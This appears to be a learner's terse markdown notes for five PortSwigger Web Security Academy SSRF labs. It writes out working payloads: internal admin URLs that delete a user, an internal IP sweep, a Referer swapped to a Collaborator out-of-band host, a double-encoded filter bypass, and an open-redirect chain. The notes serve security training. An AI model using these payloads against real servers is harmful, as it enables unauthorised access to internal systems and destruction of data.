# SSRF

---


## lab 1


- > open product and click check stock
  - > in request you find ``stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=3&storeId=1``
    > change it to ``stockApi=http://localhost/admin&storeId=3``
    > stockApi=http://localhost/admin/delete?username=carlos&storeId=3



---

## lab 2


- > ``http://192.168.0.1:8080/product/stock/check?productId=4&storeId=1``   send it to intruder 182.168.0.``1``
  > found 192.168.0.239   fond it **``404``**
- > http://192.168.0.239:8080/admin
  > http://192.168.0.239:8080/admin/delete?username=carlos




---


## lab 3


<details>
  <summary>Lab: Blind SSRF with out-of-band detection</summary>


## 1. visit product and see the request replace the ``referrer`` to url form `burp colab`

## **`from`**

```http
GET /product?productId=10 HTTP/2
Host: 0aa300db04961214802e3f50008a00aa.web-security-academy.net
Cookie: session=eKWl8nNqg8d0asyLhuim0DQQUKjA74sW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa300db04961214802e3f50008a00aa.web-security-academy.net/        <=======
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

```

## **`to`**


```http
GET /product?productId=3 HTTP/2
Host: 0aa300db04961214802e3f50008a00aa.web-security-academy.net
Cookie: session=eKWl8nNqg8d0asyLhuim0DQQUKjA74sW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://r7zxj0m1snif5tjpw74kq9bh086zuqif.oastify.com/       <======🔁
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

  
</details>




---


## lab 4


- > try to chnge url to ``http://127.0.0.1/admin`` and it blocked
  > try ``http://127.1/`` it work
  > try ``http://127.1/admin`` it blocked again
  > try ``http://127.1/%2561dmin``
  > http://127.1/%2561dmin/delete?username=carlos




---

## lab 5

- > **/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos**
  










    
